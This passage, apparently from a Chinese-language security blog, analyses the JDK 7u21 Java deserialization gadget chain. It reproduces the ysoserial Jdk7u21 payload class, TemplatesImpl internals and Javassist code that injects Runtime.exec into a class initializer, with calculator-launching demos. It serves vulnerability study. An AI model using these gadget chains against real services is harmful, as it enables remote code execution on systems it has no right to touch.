class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has</span></span><br><span class="line"><span class="comment">the same JRE version requirements.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">See: https://gist.github.com/frohoff/24af7913611f8406eaf3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Call tree:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">LinkedHashSet.readObject()</span></span><br><span class="line"><span class="comment">  LinkedHashSet.add()</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">      TemplatesImpl.hashCode() (X)</span></span><br><span class="line"><span class="comment">  LinkedHashSet.add()</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">      Proxy(Templates).hashCode() (X)</span></span><br><span class="line"><span class="comment">        AnnotationInvocationHandler.invoke() (X)</span></span><br><span class="line"><span class="comment">          AnnotationInvocationHandler.hashCodeImpl() (X)</span></span><br><span class="line"><span class="comment">            String.hashCode() (0)</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler.memberValueHashCode() (X)</span></span><br><span class="line"><span class="comment">              TemplatesImpl.hashCode() (X)</span></span><br><span class="line"><span class="comment">      Proxy(Templates).equals()</span></span><br><span class="line"><span class="comment">        AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">          AnnotationInvocationHandler.equalsImpl()</span></span><br><span class="line"><span class="comment">            Method.invoke()</span></span><br><span class="line"><span class="comment">              ...</span></span><br><span class="line"><span class="comment">                TemplatesImpl.getOutputProperties()</span></span><br><span class="line"><span class="comment">                  TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment">                    TemplatesImpl.getTransletInstance()</span></span><br><span class="line"><span class="comment">                      TemplatesImpl.defineTransletClasses()</span></span><br><span class="line"><span class="comment">                        ClassLoader.defineClass()</span></span><br><span class="line"><span class="comment">                        Class.newInstance()</span></span><br><span class="line"><span class="comment">                          ...</span></span><br><span class="line"><span class="comment">                            MaliciousClass.&lt;clinit&gt;()</span></span><br><span class="line"><span class="comment">                              ...</span></span><br><span class="line"><span class="comment">                                Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">"isApplicableJavaVersion"</span>)</span><br><span class="line"><span class="meta">@Dependencies</span>()</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.FROHOFF &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jdk7u21</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">"_auxClasses"</span>, <span class="keyword">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    JavaVersion v = JavaVersion.getLocalVersion();</span><br><span class="line">    <span class="keyword">return</span> v != <span class="keyword">null</span> &amp;&amp; (v.major &lt; <span class="number">7</span> || (v.major == <span class="number">7</span> &amp;&amp; v.update &lt;= <span class="number">21</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">PayloadRunner.run(Jdk7u21<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么是“f5a5a608”这个字符串，因为<code>hashcode（）</code>方法计算结果为<code>0</code>；这个之后会用到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = hash;</span><br><span class="line">        <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> off = offset;</span><br><span class="line">            <span class="keyword">char</span> val[] = value;</span><br><span class="line">            <span class="keyword">int</span> len = count;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                h = <span class="number">31</span>*h + val[off++];</span><br><span class="line">            &#125;</span><br><span class="line">            hash = h;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="1-createTemplatesImpl"><a href="#1-createTemplatesImpl" class="headerlink" title="1-createTemplatesImpl"></a>1-createTemplatesImpl</h2><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908104222689.png" alt="image-20200908104222689"></p><p>继续跟 能看到：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908104721460.png" alt="image-20200908104721460"></p><p>在利用 payload 中，TemplatesImpl 类主要的作用为：</p><ul><li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意class =&gt; byte array )</li><li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li></ul><p>来具体看一下，该类位于 <code>com.sun.org.apache.xalan.internal.xsltc.trax</code> 包中，用于 xml document 的处理和转换，定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title">Templates</span>, <span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure><p><code>TemplatesImpl</code> 类实现了 <code>Templates</code> 和 <code>Serializable</code> 两个接口</p><p>其中 <code>Templates</code> 接口定义如下，包含了两个方法，<strong>即之前提到触发恶意代码执行所的方法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Templates</span> </span>&#123;</span><br><span class="line">    <span class="function">Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException</span>;</span><br><span class="line">    <span class="function">Properties <span class="title">getOutputProperties</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>TemplatesImpl</code> 类中有一个 private 方法 <code>defineTransletClasses()</code>，精简后的代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[][] _bytecodes = <span class="keyword">null</span>;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        TransletClassLoader loader = ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                <span class="comment">// 调用 ClassLoader.defineClass() 方法加载 Class </span></span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要理解的是：</p><p>在方法中，调用了 <code>ClassLoader.defineClass()</code> 方法，参数为实例变量 <code>_bytecodes</code> 内的元素，该方法会将字节数组转换为 Class，并加载</p><p>也就是说，<strong>通过设置 <code>_bytecodes</code> 的内容 ，调用 <code>defineTransletClasses()</code> 方法即可加载指定的 Class</strong>。</p><p>find usages：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909150305919.png" alt="image-20200909150305919"></p><p>一共三处：</p><ul><li>getTransletClasses()</li><li>getTransletIndex()</li><li>getTransletInstance()</li></ul><p>这里满足条件的就是第三个函数<code>getTransletInstance()</code></p><p>跟进去看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line">         </span><br><span class="line">         <span class="comment">// 创建实例</span></span><br><span class="line">         AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">         ...</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>defineTransletClasses()</code> 执行后，会调用之前加载的 Class 的 <code>newInstance()</code> 方法来创建实例，触发 static block 和 constructor 的执行，根据方法，调用关系如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties() =&gt; newTransformer() =&gt; getTransletInstance() =&gt; defineTransletClasses() =&gt; ClassLoader.defineClass()</span><br></pre></td></tr></table></figure><p>可以看到调用 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 方法均可触发恶意代码的执行。</p><p>理一下思路</p><ul><li>使用 <code>javassist</code> 库创建一个包含恶意代码的 class，恶意代码可以在 static block中，或在无参构造函数里</li><li>将恶意 class 的的字节码添加到 TemplatesImpl 实例的 <code>_bytecodes</code> 变量中</li><li>调用实例的 <code>getOutputProperties()</code> 或 <code>newTransformer()</code> 方法触发恶意代码执行</li></ul><p>弹出计算器的代码示例如下 (程序报错可以忽略)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.get(Cat<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a /Applications/Calculator.app\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入恶意代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">// 使用构造方法也可以</span></span><br><span class="line">        <span class="comment">//CtConstructor constructor = cc.getDeclaredConstructor(new CtClass[]&#123;&#125;);</span></span><br><span class="line">        <span class="comment">//constructor.insertBefore(cmd);</span></span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">// 为了使 _transletIndex 正确，并执行 newInstance()，具体可查看 defineTransletClasses 方法</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] evilByteCodes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;evilByteCodes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span> + System.nanoTime());</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>在上面的代码示例中，是手动调用 <code>newTransformer()</code> 来触发恶意代码的执行，因此还需要找到一个能够在反序列化过程中，自动调用 (直接或间接) 该方法的类。</p><p>这里分为两部分,一部分是Javassist的动态注入，一部分是Templates 属性的设置。</p><blockquote><p>Javassist的作用:</p><p>通过动态字节码生成一个类，该类的静态代码块中存储恶意代码。</p><p>Templates属性设置的作用:</p><p>Templates.newTransformer() 实例化该恶意类从而触发其静态代码块中的恶意代码。</p></blockquote><p>这部分的理解，可以通过调试这个简单的触发语句来理解:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"open /Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        calc.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以跟这个，看调用的细节：</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908111442463.png" alt="image-20200908111442463"></p><p><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>调用<code>_class[_transletIndex]</code>类的无参构造方法,生成类对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里我们传入了值</span></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 引入加载器</span></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                  <span class="comment">// 这里在其他版本会有一句_tfactory.getExternalExtensionsMap()</span></span><br><span class="line">                  <span class="comment">// 为了防止出错，所以我们给_tfactory 设置 transFactory.newInstance() 这个带有getExternalExtensionsMap方法的实例</span></span><br><span class="line">                  <span class="comment">// 7u21版本下其实加不加都没关系。</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> </span><br><span class="line">                      TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            <span class="comment">// 根据_bytecodes传入的数目</span></span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                <span class="comment">// 加载字节码转化为对应的类</span></span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="comment">// _transletIndex 默认值是-1</span></span><br><span class="line">                <span class="comment">// 所以为了不出错，所以这里字节码转换为对应类的时候，其父类必须是</span></span><br><span class="line">                <span class="comment">// ABSTRACT_TRANSLET = com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code> </p><p>加载类并不会触发静态方法,但是之后会有一个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>进行实例化，从而触发我们javassist注入的静态恶意代码。</p><p>从上面我们简单归纳下执行的顺序:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.TemplatesImpl.getOutputProperties()</span><br><span class="line"><span class="number">2</span>.TemplatesImpl.newTransformer()</span><br><span class="line"><span class="number">3</span>.TemplatesImpl.getTransletInstance()</span><br><span class="line"><span class="number">4</span>.TemplatesImpl.defineTransletClasses()</span><br><span class="line"><span class="number">5</span>.ClassLoader.defineClass()</span><br><span class="line"><span class="number">6</span>.Class.newInstance()</span><br></pre></td></tr></table></figure><p>1,2,3,4中都是可以触发的点，但是1,2 是<code>public</code>方法可以被对象直接调用，而3,4是<code>private</code>方法，只能被对象可调用方法间接调用。所以第二层的目标就是触发第一点或者第二点。</p><h2 id="2-AnnotationInvocationHandler"><a href="#2-AnnotationInvocationHandler" class="headerlink" title="2-AnnotationInvocationHandler"></a>2-AnnotationInvocationHandler</h2><p>进入第二阶段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><p>第二层的核心是怎么触发第一层的<code>TemplatesImpl.newTransformer()</code></p><p>这里选择<code>newTransformer()</code>方法来触发的</p><p>首先通过Reflections框架通过调用初始化函数创建一个AnnotationInvocationHandler对象实例。</p><p>然后设置了<code>type</code>属性为<code>Templates.class</code>；</p><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908153232254.png" alt="image-20200908153232254"></p><p>这里被createProxy封装了。</p><p>在写个demo来debug理解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2nd</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"open /Applications/Calculator.app/Contents/MacOS/Calculator"</span>);<span class="comment">//生成恶意的calc</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">        Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Templates proxy = Gadgets.createProxy(tempHandler, Templates<span 